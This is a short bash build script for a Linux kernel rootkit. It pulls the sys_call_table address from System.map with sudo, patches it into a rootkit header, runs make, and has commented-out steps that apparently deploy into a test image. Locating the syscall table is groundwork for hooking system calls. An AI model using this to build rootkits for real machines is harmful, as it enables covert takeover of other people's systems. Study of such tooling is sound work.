#!/bin/bash
sys_call_table=0x`sudo grep sys_call_table /boot/System.map-$(uname -r) | head -n 1 | awk '{print $1}'`
if [ "$sys_call_table" != "" ]; then
    echo "Syscalls table address is at '$sys_call_table'."
    cp rootkit_dev.h rootkit.h
    sed -i s/SYS_CALL_TABLE_ADDR/$sys_call_table/g rootkit.h
    make

    # sudo cp -r ../rootkit ../../../mnt_rootkit/root
    # echo
    # ls -la --color=auto ../../../mnt_rootkit/root
    # cd ./../../../
    # ./start_for_rootkit.sh
    # cd -
else
    echo "Syscall table not found."
fi

